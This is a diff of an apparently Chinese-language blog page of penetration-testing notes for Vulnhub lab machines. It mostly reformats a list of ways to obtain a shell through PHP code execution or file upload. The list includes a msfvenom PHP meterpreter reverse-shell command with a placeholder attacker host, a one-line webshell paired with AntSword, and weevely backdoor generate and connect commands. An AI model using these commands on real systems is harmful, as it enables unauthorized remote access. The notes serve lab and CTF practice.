@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta 
     name="viewport"
-    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    content="width=device-width, initial-scale=1.0">
   <meta 
     http-equiv="X-UA-Compatible" 
     content="ie=edge">
@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>309 words</span>
+      <span>307 words</span>
     
   </div>
   
@@ -369,17 +369,19 @@
 <p>优先使用条件：<br>3.1 有填入并生效php代码的交互  </p>
 <ul>
 <li><strong>(msfvenom生成反弹shell代码+填入+metasploit监听)</strong>   </li>
-<li>msfvenom生成反弹shell代码：<code>msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php</code>   </li>
+<li>msfvenom生成反弹shell代码<code>msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php</code>   </li>
 </ul>
 <p>使用实例：<a target="_blank" rel="noopener" href="https://chen-299.github.io/9c45f9e.html">Vulnhub|Os-Hax</a>  </p>
 <p>3.2 能够PUT/上传php代码  </p>
 <ul>
-<li><strong>(msfvenom生成反弹shell代码+PUT/上传+metasploit监听)</strong>  </li>
-<li><strong>(一句话木马+蚁剑+/usr/share/webshells/php/php-reverse-shell.php)</strong><br>使用实例：<a target="_blank" rel="noopener" href="https://chen-299.github.io/d4ec2f86.html">Vulnhub|SickOs1.2</a>  </li>
-<li><strong>(weevely生成后门代码+PUT/上传+weevely连接后门)</strong>   </li>
-<li>生成后门<code>weevely generate &lt;password&gt; &lt;path&gt;</code>  </li>
-<li>连接后门<code>weevely &lt;URL&gt; &lt;password&gt; [cmd]</code><br>使用实例：<a target="_blank" rel="noopener" href="https://chen-299.github.io/63d10771.html">Vulnhub|JIS-CTF-VulnUpload-CTF01</a>  </li>
+<li><strong>msfvenom生成反弹shell代码+PUT/上传+metasploit监听</strong>  </li>
+<li><strong>一句话木马+蚁剑+/usr/share/webshells/php/php-reverse-shell.php</strong>     </li>
 </ul>
+<p>使用实例：<a target="_blank" rel="noopener" href="https://chen-299.github.io/d4ec2f86.html">Vulnhub|SickOs1.2</a>  </p>
+<ul>
+<li><strong>weevely生成后门代码+PUT/上传+weevely连接后门</strong><br>生成后门<code>weevely generate &lt;password&gt; &lt;path&gt;</code><br>连接后门<code>weevely &lt;URL&gt; &lt;password&gt; [cmd]</code>  </li>
+</ul>
+<p>使用实例：<a target="_blank" rel="noopener" href="https://chen-299.github.io/63d10771.html">Vulnhub|JIS-CTF-VulnUpload-CTF01</a>  </p>
 </blockquote>
 </blockquote>
 <h2 id="u83B7_u53D6_u4EA4_u4E92_u5F0Fshell"><a href="#u83B7_u53D6_u4EA4_u4E92_u5F0Fshell" class="headerlink" title="获取交互式shell"></a>获取交互式shell</h2><blockquote>
